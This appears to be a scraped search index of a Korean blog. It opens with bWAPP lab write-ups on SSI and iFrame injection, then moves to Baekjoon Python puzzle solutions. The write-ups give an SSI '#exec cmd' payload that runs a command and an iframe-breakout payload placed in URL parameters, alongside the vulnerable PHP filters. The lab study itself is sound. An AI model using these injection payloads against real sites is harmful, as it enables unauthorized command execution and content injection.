Codefunctions_external.php 123function no_check($data){ return $data;} ssii.php 12345678910111213141516if($firstname == &quot;&quot; or $lastname == &quot;&quot;){ $field_empty = 1;}else{ $line = '&lt;p&gt;Hello ' . $firstname . ' ' . $lastname . ',&lt;/p&gt;&lt;p&gt;Your IP address is:' . '&lt;/p&gt;&lt;h1&gt;&lt;!--#echo var=&quot;REMOTE_ADDR&quot; --&gt;&lt;/h1&gt;'; // Writes a new line to the file $fp = fopen(&quot;ssii.shtml&quot;, &quot;w&quot;); fputs($fp, $line, 200); fclose($fp); header(&quot;Location: ssii.shtml&quot;); exit;} 빈 입력값을 검증하는 항목은 있지만, 입력값은 그대로 출력한다. MediumLow Level에서 확인해봤던 HTML 태그를 입력해봤더니, 그대로 출력이 되었다.&lt;, &gt;, / 3개의 특수 문자 검증이 없을 것으로 추측이 된다. &quot;, '도 검증 없이 출력이 되는지 확인하겠다.First Name : &lt;!--#exec cmd=&quot;ls&quot; --&gt;Last Name : test 결과는 막힌 것으로 확인되었다. &quot;, '을 검사하여, 치환된 것으로 추측이 된다. First Name : &lt;!--#exec cmd=ls --&gt;Last Name : test &quot;, '을 제거 후 출력 결과를 보니 SSI 지시어가 잘 실행되는 것을 확인 할 수 있었다. Source Code123456function xss_check_4($data){ // addslashes - returns a string with backslashes before characters that need to be quoted in database queries etc. // These characters are single quote ('), double quote (&quot;), backslash (\\) and NUL (the NULL byte). // Do NOT use this for XSS or HTML validations!!! return addslashes($data);} addslashes 함수는 iFrame Injection 문제에서 확인할 수 있다.Link : http://lrtk-github.io/2020/12/09/iFrame-Injection-1/ High123456789function xss_check_3($data, $encoding = &quot;UTF-8&quot;){ // htmlspecialchars - converts special characters to HTML entities // '&amp;' (ampersand) becomes '&amp;amp;' // '&quot;' (double quote) becomes '&amp;quot;' when ENT_NOQUOTES is not set // &quot;'&quot; (single quote) becomes '&amp;#039;' (or &amp;apos;) only when ENT_QUOTES is set // '&lt;' (less than) becomes '&amp;lt;' // '&gt;' (greater than) becomes '&amp;gt;' return htmlspecialchars($data, ENT_QUOTES, $encoding);} htmlspecialchars 함수도 iFrame Injection 문제에서 확인할 수 있다.","link":"/2020/12/16/SSI-Injection/"},{"title":"iFrame Injection","text":"LowbWAPP/iframei.php?ParamUrl=robots.txt&amp;ParamWidth=250&amp;ParamHeight=250 Url를 보면 robots.txt을 iFrame에 넣어서 출력한다.ParamUrl을 robots.txt말고 다른 링크을 넣으면 출력이 되는지 확인하였다. bWAPP/iframei.php?ParamUrl=index.php&amp;ParamWidth=250&amp;ParamHeight=250 출력이 되는 모습을 볼 수 있다.여기서는 아무 악성 행위가 없는 사이트를 넣어지만, 만약 Xss가 들어있는 사이트를 넣으면 공격을 시도 할 수도 있다. 소스 코드를 확인하면, 바로 url를 출력하는 것을 확인 할 수 있다. 123function no_check($data){ return $data;} Medium물론 안되겠지만, Low처럼 index.php를 불려오도록 하겠다.bWAPP/iframei.php?ParamUrl=index.php&amp;ParamWidth=250&amp;ParamHeight=250 역시 보완이 되었는지 index.php가 출력이 안된 것을 확인할 수 있다.Url의 파라미터를 확인해보니, iframe의 옵션으로 확인 할 수 있다. 이것들을 이용한다면, Xss나 iFrame Injection이 가능할 것 같다.이를 위해, 개발자 도구를 이용하여 해당 파라미터가 어떻게 넣어지는지를 확인하였다. Url의 파라미터에 아무 값을 안 넣고 소스 코드를 확인하였을 때의 모습이다.bWAPP/iframei.php?ParamUrl=robots.txt&amp;ParamWidth=250&amp;ParamHeight=250 1&lt;iframe frameborder=&quot;0&quot; src=&quot;robots.txt&quot; height=&quot;250&quot; width=&quot;250&quot;&gt;&lt;/iframe&gt; 가장 마지막 파라미터에 test를 입력하여 소스 코드를 확인하였다.bWAPP/iframei.php?ParamUrl=test&amp;ParamWidth=test1&amp;ParamHeight=test2 1&lt;iframe frameborder=&quot;0&quot; src=&quot;robots.txt&quot; height=&quot;test2&quot; width=&quot;test1&quot;&gt;&lt;/iframe&gt; src는 robots.txt가 고정으로 확인되었다. 아마 다른 링크를 넣는 것을 방지하기 위함으로 추측이 된다.하지만, 다른 파라미터는 값을 넣을 수 있다. 이를 이용하여 iFrame Injection하겠다. ParamWidth에 &quot;&gt;&lt;/iframe&gt;&lt;iframe src='index.php' height=&quot;250&quot; width=&quot;250&quot;&gt;&lt;/iframe&gt;을 추가하여 Injection을 시도하겠다. 1&lt;iframe frameborder=&quot;0&quot; src=&quot;robots.txt&quot; height=&quot;250&quot; width=&quot;250&quot;&gt;&lt;/iframe&gt; 전혀 변경된 것이 없다. 생각을 하면, &lt;, &gt;, /을 지웠다면, 지워진 나머지 문자열은 남아있어야 하는데 전혀 볼 수가 없다.그래서 ParamWidth와 ParamHeight에 &lt;/test&gt;을 넣어서 확인해봤다. bWAPP/iframei.php?ParamUrl=robots.txt&amp;ParamWidth=250&quot;&lt;/test&gt;&amp;ParamHeight=250&quot;&lt;/test&gt; 1&lt;iframe frameborder=&quot;0&quot; src=&quot;robots.txt&quot; height=&quot;250\\&quot; &lt;=&quot;&quot; test=&quot;&quot;&gt;&quot; width=&quot;250\\&quot;&lt;/test&gt;&quot;&gt;&lt;/iframe&gt; 뭔가 이상하게 되었다. 하지만, ParamWidth에 넣었을 때와 다르게 소스코드에 넣어졌기 때문에 다시 한번 ParamWidth에 넣었던 &quot;&gt;&lt;/iframe&gt;&lt;iframe src='index.php' height=&quot;250&quot; width=&quot;250&quot;&gt;&lt;/iframe&gt;을 넣어서 시도하였다. bWAPP/iframei.php?ParamUrl=robots.txt&amp;ParamWidth=250&amp;ParamHeight=250&quot;&gt;&lt;/iframe&gt;&lt;iframe src='index.php' height=&quot;250&quot; width=&quot;250&quot;&gt;&lt;/iframe&gt; 12&lt;iframe frameborder=&quot;0&quot; src=&quot;robots.txt&quot; height=&quot;250\\&quot;&gt;&lt;/iframe&gt;&lt;iframe src=&quot;\\'index.php\\'&quot; height=&quot;\\&amp;quot;250\\&amp;quot;&quot; width=&quot;\\&amp;quot;250\\&amp;quot;&quot;&gt;&lt;/iframe&gt; iframe Injection이 성공한 것을 확인할 수 있다. 이제 어떻게 iframe Injection을 방어했는지 소스 코드를 확인하겠다. Source Code1234567function xss_check_4($data){ // addslashes - returns a string with backslashes before characters that need to be quoted in database queries etc. // These characters are single quote ('), double quote (&quot;), backslash (\\) and NUL (the NULL byte). // Do NOT use this for XSS or HTML validations!!! return addslashes($data);} addslashes 함수를 사용하여 유효성 검사를 하였다. addslashes 함수Link : http://www.w3big.com/ko/php/func-string-addslashes.html addslashes 함수는 데이터베이스에 특수 문자를 넣을 경우 예상치 못한 오류를 발생하는 것을 치환하여 방지하는 함수이다. [ 치환되는 문자 ] ‘ “ \\ NULL 이 문자들은 출력이 될 때 앞에 \\이 붙는다. 소스 코드의 주석을 보면 Xss과 HTML의 유효성 검사로는 쓰지말라는 주의가 적혀져 있다. High12345678910function xss_check_3($data, $encoding = &quot;UTF-8&quot;){ // htmlspecialchars - converts special characters to HTML entities // '&amp;' (ampersand) becomes '&amp;amp;' // '&quot;' (double quote) becomes '&amp;quot;' when ENT_NOQUOTES is not set // &quot;'&quot; (single quote) becomes '&amp;#039;' (or &amp;apos;) only when ENT_QUOTES is set // '&lt;' (less than) becomes '&amp;lt;' // '&gt;' (greater than) becomes '&amp;gt;' return htmlspecialchars($data, ENT_QUOTES, $encoding); } HTML Injection의 High Level처럼 htmlspecialchars 함수를 사용하여 유효성 검사를 하였다.","link":"/2020/12/08/iFrame-Injection-1/"},{"title":"백준 브론즈4 15963번 문제","text":"CASIO카시오 계산기는 만능 계산기이다. 시험을 한 번이라도 쳐본 일곽인이라면, 이 카시오의 소중함에 대해서 뼈저리게 느껴보았을 것이다. 하지만, 이런 카시오에도 함정이 있다. 바로, 카시오 계산기는 배터리를 통해 돌아간다는 것이다. 송찬이는 시험을 치다가 갑자기 계산기의 배터리가 나가버렸다. 그래서 선생님께 배터리를 달라고 요구했는데, 요구하고 보니 카시오 계산기의 배터리가 어떤 종류인지 말을 안 해버렸다! 과연 선생님은 송찬이가 필요한 배터리 종류를 들고 왔을까? 문제풀이12n, m = map(int, input().split())print(1 if n==m else 0) 삼항연산자로 깔끔하게 풀이하였다.파이썬의 삼항연산자 형태는 [True Value] if [Condition] else [False Value]으로 이루어진다. 숏코딩 문제풀이1print(2-len({*input().split()})) 두 개의 입력 중복을 확인하는 문제이다.이 풀이는 딕셔너리의 Key 중복이 안된다는 점을 이용하였다. 입력 받은 값을 Key로 저장되는데 만약 같은 값이면 단 하나만 저장이 되기 때문에 len 함수를 찍어본다면 ‘1’로 출력하게 된다. 만약 두 개의 입력값이 서로 다른 값이면 2개의 Key가 저장이 되고, len 함수는 ‘2’를 출력할 것이다. 2개의 입력값이 중복이면 1, 아니면 0이므로 2와 len 함수의 출력값을 빼준다면 원하는 값을 얻을 수 있다. 이 문제에선 Dict를 이용했지만, set으로 이용할 수 있다.","link":"/2021/02/07/%EB%B0%B1%EC%A4%80-15963%EB%B2%88-%EB%AC%B8%EC%A0%9C/"},{"title":"백준 브론즈5 - 1001번 문제","text":"백준 1001번 문제A-BLink : https://www.acmicpc.net/problem/1001 1print(int(input())-int(input())) 1000번 문제처럼 데이터를 입력받아 정수형으로 변환하여 -를 해주었다.하지만 결과는? 런타임 에러이유는 모르겠다… 혹시 아시는 분은 댓글 부탁드립니다… 일단 입력값은 ‘3 2’이다. 이를 입력받아야히는데 어떻게 입력을 받아야할까? 123a, b = input().split()print(a)print(b) split함수를 사용하면 하나의 input함수로 여러 변수에 값을 넣어줄 수 있다. splitLink : https://wikidocs.net/13#split split함수는 문자열을 나누는 함수이다. 12s = 'a b c d'print(s.split()) # ['a', 'b', 'c', 'd'] 출력 list로 return되어지만, input에는 각 하나씩 입력되어 변수에 저장될 것이다.이를 이용해서 문제를 해결해보자. 12a, b = input().split()print(int(a)-int(b)) input은 문자열로 데이터를 넣어주기 때문에 값을 계산하기 위해서는 정수 변환이 필수이다.하지만 입력받은 정수가 100개라면? 하나하나 int함수를 넣어서 계산해야하나?답은 map함수에 있다. mapLink : https://wikidocs.net/32#map map(f, iterable)로 함수(f)와 반복 가능한(iterable) 자료형을 입력받아 f에 iterable를 넣어서 f의 결과를 묶어서 돌려주는 함수이다.","link":"/2020/11/07/%EB%B0%B1%EC%A4%80-%EB%B8%8C%EB%A1%A0%EB%93%9C5-1001%EB%B2%88-%EB%AC%B8%EC%A0%9C/"},{"title":"백준 브론즈4 - 10039번 문제","text":"백준 10039번 문제평균 점수상현이가 가르치는 아이폰 앱 개발 수업의 수강생은 원섭, 세희, 상근, 숭, 강수이다.어제 이 수업의 기말고사가 있었고, 상현이는 지금 학생들의 기말고사 시험지를 채점하고 있다. 기말고사 점수가 40점 이상인 학생들은 그 점수 그대로 자신의 성적이 된다. 하지만, 40점 미만인 학생들은 보충학습을 듣는 #### 조건을 수락하면 40점을 받게 된다. 보충학습은 거부할 수 없기 때문에, 40점 미만인 학생들은 항상 40점을 받게 된다.학생 5명의 점수가 주어졌을 때, 평균 점수를 구하는 프로그램을 작성하시오.Link : https://www.acmicpc.net/problem/2753 1234567num = [i for i in map(int, open(0))]sum = 0for i in num: if i &lt; 40: i = 40 sum += i print(sum//5) 저 코드는 c언어 스타일의 코드이다.파이썬스럽게 수정하겠다. 1print(eval(&quot;+max(8,int(input())//5)&quot;*5)) 차근차근 설명하자면, int(input())//5으로 나누었다. 하지만 max 함수를 이용하여 나눈 값이 8보다 낮으면, 8로 출력하게 하였다.생각 없이 보고 있다면, 왜 8인지를 모르는 사람이 있을 것이다. 이유는 40/5 = 8 이므로, 40보다 작으면 8보다 작다는 공식이 성립이 된다. 그 후, eval를 이용하기 위해 문자열로 만들었고, 평균 값을 구하기 위해 나눈 값 앞에 +를 해주었다. 또한 문자열은 곱하기를 해주면 반복함으로 5번 입력받아 5명의 점수를 입력하였다.","link":"/2020/12/30/%EB%B0%B1%EC%A4%80-%EB%B8%8C%EB%A1%A0%EC%A6%884-10039%EB%B2%88-%EB%AC%B8%EC%A0%9C/"},{"title":"백준 브론즈4 - 1008번 문제","text":"백준 1008번 문제A / B두 정수 A와 B를 입력받은 다음, A/B를 출력하는 프로그램을 작성하시오.Link : https://www.acmicpc.net/problem/1008 1print(eval(input().replace(' ', '/'))) eval을 이용하여 문제 풀이를 하였다.eval이 무엇인지 궁금하신 분들은 백준 브론즈5 - 1000번 문제에서 설명하였다.Link : lrtk-coder.github.io/2020/11/07/백준-브론즈5-1001번-문제/","link":"/2020/12/08/%EB%B0%B1%EC%A4%80-%EB%B8%8C%EB%A1%A0%EC%A6%884-1008%EB%B2%88-%EB%AC%B8%EC%A0%9C/"},{"title":"백준 브론즈4 - 10101번 문제","text":"백준 브론즈4 10101번 문제창영이는 삼각형의 종류를 잘 구분하지 못한다. 따라서 프로그램을 이용해 이를 외우려고 한다.삼각형의 세 각을 입력받은 다음, * 세 각의 크기가 모두 60이면, Equilateral * 세 각의 합이 180이고, 두 각이 같은 경우에는 Isosceles * 세 각의 합이 180이고, 같은 각이 없는 경우에는 Scalene * 세 각의 합이 180이 아닌 경우에는 Error를 출력하는 프로그램을 작성하시오.10101번: 삼각형 외우기 문제풀이123456a = sorted(list(map(int, open(0))))if a[0]+a[1]+a[2] != 180: print('Error')else: if a[0] &lt; a[1] &lt; a[2]: print('Scalene') elif a[0] == a[2]: print('Equilateral') else: print('Isosceles') 이번 문제는 삼각형의 3변의 길이를 이용하여 각을 찾는 문제이다.3변의 길이가 같으면, 3개의 각 크기도 같으니 Equilateral2변의 길이가 같으면, 2개의 각 크기도 같으니 Isosceles같은게 없으면, 같은 각도 없으니 Scalene 코드는 간단하게 작성하였다.이것을 인덱싱을 이용하여 구현하면, 거의 난독화 수준의 코드가 만들어진다. 숏코딩 문제풀이12a = sorted(list(map(int, open(0))))print([[['Isosceles', 'Scalene'][a[0] &lt; a[1] &lt; a[2]], 'Equilateral'][a[0] == a[2]], 'Error'][a[0]+a[1]+a[2] != 180])","link":"/2021/01/22/%EB%B0%B1%EC%A4%80-%EB%B8%8C%EB%A1%A0%EC%A6%884-10101%EB%B2%88-%EB%AC%B8%EC%A0%9C/"},{"title":"백준 브론즈4 - 10156번 문제","text":"백준 브론즈4 10156번 문제동수는 제과점에 과자를 사러 가는데 현재 가진 돈이 모자랄 경우 부모님께 모자란 돈을 받으려고 한다. 과자 한 개의 가격이 K, 사려고 하는 과자의 개수가 N이고, 현재 가진 돈의 액수를 M이라 할 때 여러분은 동수가 부모님께 받아야 하는 모자란 돈을 계산하려고 한다.예를 들어, 과자 한 개의 가격이 30원, 사려고 하는 과자의 개수가 4개, 현재 동수가 가진 돈이 100원이라 할 때, 동수가 부모님께 받아야 하는 돈은 20원이다. 과자 한 개의 가격이 250원, 사려고 하는 과자의 개수가 2개, 현재 동수가 가진 돈이 140원이라 할 때, 동수가 부모님께 받아야 하는 돈은 360원이다. 과자 한 개의 가격이 20원, 사려고 하는 과자의 개수가 6개, 현재 동수가 가진 돈이 120원이라 할 때 동수가 부모님께 받아야 하는 돈은 0원이다. 과자 한 개의 가격이 20원, 사려고 하는 과자의 개수가 10개, 현재 동수가 가진 돈이 320원이라 할 때 동수가 부모님께 받아야 하는 돈은 역시 0원이다.과자 한 개의 가격, 사려고 하는 과자의 개수와 동수가 현재 가진 돈의 액수가 주어질 때 동수가 부모님께 받아야 하는 돈의 액수를 출력하는 프로그램을 작성하시오. 문제풀이123a, b, c = map(int, input().split())if a*b &gt; c: print(a*b-c)else: print(0) 조건문과 사칙 연산을 이용하여 문제를 풀이하였다. 숏코딩 문제풀이12a, b, c = map(int, input().split())print(max(a*b-c, 0)) Max 함수를 이용하여 조건문을 사용하지 않고 해결하였다.여유 돈보다 구입액이 많으면 양수가 나와서 0보다 크므로 차액이 나온다.그 반대는 음수가 나오므로 0이 큰 수가 되어 0이 나온다.","link":"/2021/01/22/%EB%B0%B1%EC%A4%80-%EB%B8%8C%EB%A1%A0%EC%A6%884-10156%EB%B2%88-%EB%AC%B8%EC%A0%9C/"},{"title":"백준 브론즈4 - 10162번 문제","text":"백준 브론즈4 10162번 문제3개의 시간조절용 버튼 A B C가 달린 전자레인지가 있다. 각 버튼마다 일정한 시간이 지정되어 있어 해당 버튼을 한번 누를 때마다 그 시간이 동작시간에 더해진다. 버튼 A, B, C에 지정된 시간은 각각 5분, 1분, 10초이다.냉동음식마다 전자레인지로 요리해야할 시간 T가 초단위로 표시되어 있다. 우리는 A, B, C 3개의 버튼을 적절히 눌러서 그 시간의 합이 정확히 T초가 되도록 해야 한다. 단 버튼 A, B, C를 누른 횟수의 합은 항상 최소가 되어야 한다. 이것을 최소버튼 조작이라고 한다.만일 요리시간이 100초라고 하면(T=100) B를 1번, C는 4번 누르면 된다. 이와 다르게 C를 10번 눌러도 100초가 되지만 이 경우 10번은 최소 횟수가 아니기 때문이 답이 될 수 없다. 이 경우 B 1번, C 4번, 총 5번이 최소버튼 조작이다. 그리고 T=234와 같이 3개의 버튼으로 시간을 정확히 맞출 수 없는 경우도 있다.여러분은 주어진 요리시간 T초를 맞추기 위한 최소버튼 조작 방법을 구하는 프로그램을 작성해야 한다.10162번: 전자레인지 문제풀이12345678910111213t = int(input())a = t//300n = t%300b = n//60n = n%60c = n//10n = n%10if (n!=0): print(-1)else: print(a, b, c) 기본적인 사칙 연산과 조건문을 이용하여 문제풀이를 하였다.a, b, c는 각각 5분, 1분, 10초라는 시간이 지정되어 있다. 초 단위로 변환을 하면300, 60, 10로 변환이 가능하다. 최소 횟수를 구하기 위해서는 큰 숫자 순으로 나누기를 하고, 나머지를 넘겨주어 나누어줬다. 만약 c까지 나누고, 나머지가 0이 아닌 경우는 답이 나올 수 없는 시간이라 -1를 출력하였다. 숏코딩 문제풀이12n=int(input())print(*[[-1],[n//300,n%300//60,n%300%60//10]][n%10&lt;1]) 기본 문제풀이와 같은 방식으로 진행이 되어지만, 추가적으로 인덱싱을 이용하여 코드를 간편화 시켰다. [[-1],[n//300,n%300//60,n%300%60//10]]은 기본 문제풀이를 참고하면 된다.[n%10&lt;1]은 c까지 나눈 나머지가 0이 아닌 경우를 False, 0이면 True 값을 이용하여 인덱싱을 하였다. 여기서 왜 10을 나눈 나머지를 이용하는가에 대한 의문을 가질 수 도 있다.이유는 c가 10이기 때문이다. 마지막 c로 나눈 나머지가 0이 아니면 그 값은 a,b,c로 조합하여 나올 수 없는 값이다.","link":"/2021/01/22/%EB%B0%B1%EC%A4%80-%EB%B8%8C%EB%A1%A0%EC%A6%884-10162%EB%B2%88-%EB%AC%B8%EC%A0%9C/"},{"title":"백준 브론즈4 10707번 문제","text":"백준 브론즈4 10707번 문제JOI군이 살고 있는 지역에는 X사와 Y사, 두 개의 수도회사가 있다. 두 회사의 수도요금은 한 달간 수도의 사용량에 따라 다음과 같이 정해진다. X사 : 1리터당 A엔. Y사 : 기본요금은 B엔이고, 사용량이 C리터 이하라면 요금은 기본요금만 청구된다. 사용량이 C리터가 넘었을 경우 기본요금 B엔에 더해서 추가요금이 붙는다. 추가요금은 사용량이 C리터를 넘었을 경우 1리터를 넘었을 때마다 D엔이다. JOI군의 집에서 한 달간 쓰는 수도의 양은 P리터이다.수도요금이 최대한 싸게 되도록 수도회사를 고를 때, JOI군의 집의 1달간 수도요금을 구하여라.10707번: 수도요금 문제풀이1234a, b, c, d, p = map(int, open(0))if p &gt; c: y = d * (p-c) + belse: y = bprint(min(a*p, y)) 간단하게 문제풀이를 하였다. 숏코딩 문제풀이12a, b, c, d, p = map(int, open(0))print(min(a * p, max(0, p - c) * d + b)) 이 풀이는 수도의 양(a)이 사용량(p)보다 적을 때 음수가 나온다는 것을 이용한 문제 풀이이다.max 함수를 이용하여 만약 음수가 나올 경우 0를 나오게 하여 추가요금(c)와 곱한다. 그럼 0이 나오게 되며, 실질적으로 y = b와 같은 형식이 된다. #백준","link":"/2021/01/26/%EB%B0%B1%EC%A4%80-%EB%B8%8C%EB%A1%A0%EC%A6%884-10707%EB%B2%88-%EB%AC%B8%EC%A0%9C/"},{"title":"백준 브론즈4 - 10797번 문제","text":"백준 브론즈4 10797번 문제서울시는 6월 1일부터 교통 혼잡을 막기 위해서 자동차 10부제를 시행한다. 자동차 10부제는 자동차 번호의 일의 자리 숫자와 날짜의 일의 자리 숫자가 일치하면 해당 자동차의 운행을 금지하는 것이다. 예를 들어, 자동차 번호의 일의 자리 숫자가 7이면 7일, 17일, 27일에 운행하지 못한다. 또한, 자동차 번호의 일의 자리 숫자가 0이면 10일, 20일, 30일에 운행하지 못한다.여러분들은 일일 경찰관이 되어 10부제를 위반하는 자동차의 대수를 세는 봉사활동을 하려고 한다. 날짜의 일의 자리 숫자가 주어지고 5대의 자동차 번호의 일의 자리 숫자가 주어졌을 때 위반하는 자동차의 대수를 출력하면 된다.Link : 10797번: 10부제 문제 풀이123456789a = int(input())b = map(int, input().split())sum = 0for i in b: if a == i: sum += 1 print(sum) 반복문과 조건문을 사용하여 문제 해결하였다.이제 반복문과 조건문을 대신하여 파이썬의 내장 함수인 ::Count 함수::를 이용하여 풀이하겠다. 123i = inputk = i()print(i().count(k)) 이렇게 간단하게 구현하였다. 코드 해석변수 i를 input 함수로 지정하였다. 즉, 변수 i가 input 함수 그 자체가 된 것이다.변수 k에 첫번째 입력값을 넣어주고, print 함수 안에 있는 i()가 두번째 입력값을 받아서 count 함수로 k 값이 있는지 카운트를 하였다. Count 함수Link : 02-3 리스트 자료형 - 점프 투 파이썬점프투파이썬을 참고하면 된다.","link":"/2021/01/21/%EB%B0%B1%EC%A4%80-%EB%B8%8C%EB%A1%A0%EC%A6%884-10797%EB%B2%88-%EB%AC%B8%EC%A0%9C/"},{"title":"백준 브론즈4 11943번 문제","text":"파일 옮기기두 개의 바구니에 사과와 오렌지가 있다. 첫 번째 바구니에는 사과 A개와 오렌지 B개가 있으며 두 번째 바구니에는 사과 C개와 오렌지 D개가 있다. 당신은 한 바구니에 있는 과일 하나를 집어서 다른 바구니로 옮길 수 있다. 이런 식으로 과일을 옮길 때, 한 바구니에는 사과만 있게 하고 다른 쪽에는 오렌지만 있게 하려고 한다. 앞서 말한 조건을 만족하도록 과일을 옮길 때, 과일을 옮기는 최소 횟수를 구하는 프로그램을 작성하여라. 문제풀이1234a, b = map(int, input().split())c, d = map(int, input().split())print(min(a+d, c+b)) 두 개의 바구니에서 서로 다른 바구니의 사과와 오렌지의 합을 구해서 최소값을 구하면 된다.","link":"/2021/02/04/%EB%B0%B1%EC%A4%80-%EB%B8%8C%EB%A1%A0%EC%A6%884-11943%EB%B2%88-%EB%AC%B8%EC%A0%9C/"},{"title":"백준 브론즈4 - 1212번 문제","text":"백준 브론즈4 1212번 문제 8진수가 주어졌을 때, 2진수로 변환하는 프로그램을 작성하시오. 문제풀이1print(bin(int(input(), 8))[2:]) int 함수의 파라미터를 8진수로 지정하여 8진수를 입력받아 bin 함수를 이용하여 2진수로 구하였다.하지만, 출력하면 0b11001100이라는 값이 출력이 된다.이를 해결하기 위해 슬라이싱을 이용하여 0b를 제거하였다. 숏코딩 문제풀이1print(f'{int(input(),8):b}') 이 코드는 bin 함수를 사용하지 않고, f-string을 이용하여 2진수를 구하였다. f-string 모드123456a = input() # 입력 10print(f'{int(a):b}') # 출력 1010print(f'{int(a):o}') # 출력 12print(f'{int(a):x}') # 출력 aprint(f'{int(a):X}') # 출력 Aprint(f'{int(a):d}') # 출력 10 123456a = input() # 입력 10print(f'{int(a):#b}') # 출력 0b1010print(f'{int(a):#o}') # 출력 0a12print(f'{int(a):#x}') # 출력 0xaprint(f'{int(a):#X}') # 출력 0XAprint(f'{int(a):#d}') # 출력 10","link":"/2021/01/22/%EB%B0%B1%EC%A4%80-%EB%B8%8C%EB%A1%A0%EC%A6%884-1212%EB%B2%88-%EB%AC%B8%EC%A0%9C/"},{"title":"백준 브론즈4 1297번 문제","text":"TV 크기김탑은 TV를 사러 인터넷 쇼핑몰에 들어갔다. 쇼핑을 하던 중에, TV의 크기는 그 TV의 대각선의 길이로 나타낸 다는 것을 알았다. 하지만, 김탑은 대각선의 길이가 같다고 해도, 실제 TV의 크기는 다를 수도 있다는 사실에 직접 TV를 보러갈걸 왜 인터넷 쇼핑을 대각선의 길이만 보고있는지 후회하고 있었다. 인터넷 쇼핑몰 관리자에게 이메일을 보내서 실제 높이와 실제 너비를 보내달라고 했지만, 관리자는 실제 높이와 실제 너비를 보내지 않고 그것의 비율을 보내왔다. TV의 대각선 길이와, 높이 너비의 비율이 주어졌을 때, 실제 높이와 너비의 길이를 출력하는 프로그램을 작성하시오. 문제 풀이12345import matha, b, c = map(int, input().split())d = math.sqrt(a**2 / (b**2 + c**2))print(int(d*b), int(d*c)) TV 인치와 높이, 너비의 비율을 이용하여 높이, 넓이를 구하는 문제이다.구하는 공식은 인터넷에 검색한다면 나오니, 검색하면 된다.","link":"/2021/02/05/%EB%B0%B1%EC%A4%80-%EB%B8%8C%EB%A1%A0%EC%A6%884-1297%EB%B2%88-%EB%AC%B8%EC%A0%9C/"},{"title":"백준 브론즈4 - 9498번 문제","text":"백준 9498번 문제시험 성적시험 점수를 입력받아 90 ~ 100점은 A, 80 ~ 89점은 B, 70 ~ 79점은 C, 60 ~ 69점은 D, 나머지 점수는 F를 출력하는 프로그램을 작성하시오.Link : https://www.acmicpc.net/problem/9498 123456a = int(input())if 90 &lt;= a &lt;= 100: print('A')elif 80 &lt;= a &lt;= 89: print('B')elif 70 &lt;= a &lt;= 79: print('C')elif 60 &lt;= a &lt;= 69: print('D')else: print('F') if문을 사용하여 문제를 해결하였다. 하지만 문제를 한 줄로 해결할 수 있다.문제에서는 10단위 씩 나누어 점수 평가를 하였다. 즉, 입력된 점수의 10의 자리를 알면 점수를 줄 수 있다는 것이다. 1print('FFFFFFDCBA'[int(input())//10]) 인덱싱를 사용하여 한 줄로 해결하였다.여기서 주의할 점은 Index은 시작이 0부터 시작함으로 총 11개의 평가 점수를 입력해주었다. IndexLink : https://wikidocs.net/14 12345list = [1, 2, 3]str = '123'print(list[2]) # 출력 : 3print(str[1]) # 출력 : 2 이런식으로 문자열, 리스트, 튜플, 딕셔너리 등에 유용하게 쓸 수 있다. Slicing12345list = [1, 2, 3]str = '123'print(list[0:2]) # 출력 : 3print(str[1:]) # 출력 : 2 Index로 범위를 지정하여 그 범위 안에 있는 데이터를 출력한다.","link":"/2020/12/09/%EB%B0%B1%EC%A4%80-%EB%B8%8C%EB%A1%A0%EC%A6%884-1330%EB%B2%88-%EB%AC%B8%EC%A0%9C/"},{"title":"백준 브론즈4 - 1330번 문제","text":"백준 1330번 문제두 수 비교하기두 정수 A와 B가 주어졌을 때, A와 B를 비교하는 프로그램을 작성하시오.Link : https://www.acmicpc.net/problem/1330 1234a, b = map(int, input().split())if a &gt; b: print('&gt;')elif a &lt; b: print('&lt;')else: print('==') 9498번 문제와 같이 조건문을 사용하여 문제 해결을 했다.하지만 bool과 index을 조합하면 좀 더 python스럽게 만들 수 있다. 12a,b=map(int,input().split())print(['&gt;&lt;'[a&lt;b],'=='][a==b]) false는 0으로 표현이 가능하고, true는 1로 표현이 가능하다.이것을 이용하여 index을 이용하였다. 12print(2&lt;2, '12'[2&lt;1]) # 출력 : False 1print(2&lt;3, '12'[2&lt;3]) # 출력 : True 2","link":"/2020/12/24/%EB%B0%B1%EC%A4%80-%EB%B8%8C%EB%A1%A0%EC%A6%884-1330%EB%B2%88-%EB%AC%B9/"},{"title":"백준 브론즈4 - 14681번 문제","text":"백준 14681번 문제사분면 고르기흔한 수학 문제 중 하나는 주어진 점이 어느 사분면에 속하는지 알아내는 것이다. 사분면은 아래 그림처럼 1부터 4까지 번호를 갖는다. “Quadrant n”은 “제n사분면”이라는 뜻이다. 예를 들어, 좌표가 (12, 5)인 점 A는 x좌표와 y좌표가 모두 양수이므로 제1사분면에 속한다. 점 B는 x좌표가 음수이고 y좌표가 양수이므로 제2사분면에 속한다.점의 좌표를 입력받아 그 점이 어느 사분면에 속하는지 알아내는 프로그램을 작성하시오. 단, x좌표와 y좌표는 모두 양수나 음수라고 가정한다.Link : https://www.acmicpc.net/problem/2753 123456789101112a, b = map(int, open(0))if a &gt;= 0: if b &gt;= 0: print(1) else: print(4)else: if b &gt;=0: print(2) else: print(3) 조건문을 왕창써서 해결한 코드이다.좀 더 파이썬스럽게 변경하곘다. 1print(&quot;3421&quot;[input()&gt;&quot;0&quot;::2][input()&gt;&quot;0&quot;]) 슬라이싱과 bool을 이용하여 수정하였다.두 개의 설명은 9498번 문제와 1038번 문제를 보면 된다.Link : https://lrtk-coder.github.io/2020/12/08/%EB%B0%B1%EC%A4%80-%EB%B8%8C%EB%A1%A0%EC%A6%884-1008%EB%B2%88-%EB%AC%B8%EC%A0%9C/ 코드를 설명하자면,&quot;3421&quot;[input()&gt;&quot;0&quot;::2]은 입력받은 값이 0보다 크면 True가 나온다.파이썬에서 True는 1로 통한다. 그래서 파이썬에선 ::2의 조건을 통해서 index 1의 자리와 3의 자리를 출력한다.그 후, [input()&gt;&quot;0&quot;]을 통해 인덱스 0의 자리를 가져올지, 1의 자리를 가져올지를 결정한다.","link":"/2020/12/30/%EB%B0%B1%EC%A4%80-%EB%B8%8C%EB%A1%A0%EC%A6%884-14681%EB%B2%88-%EB%AC%B8%EC%A0%9C/"},{"title":"백준 브론즈4 15680번 문제","text":"연세대학교 연세대학교의 영문명은 YONSEI, 슬로건은 Leading the Way to the Future이다. 이를 출력하는 프로그램을 작성해보도록 하자. 백준 15680번 문제 문제풀이1print(['YONSEI', 'Leading the Way to the Future'][int(input())]) 입력값이 0과 1 뿐이니, 리스트에 출력값을 넣어서 index에 입력값을 넣으면 원하는 출력값을 볼 수 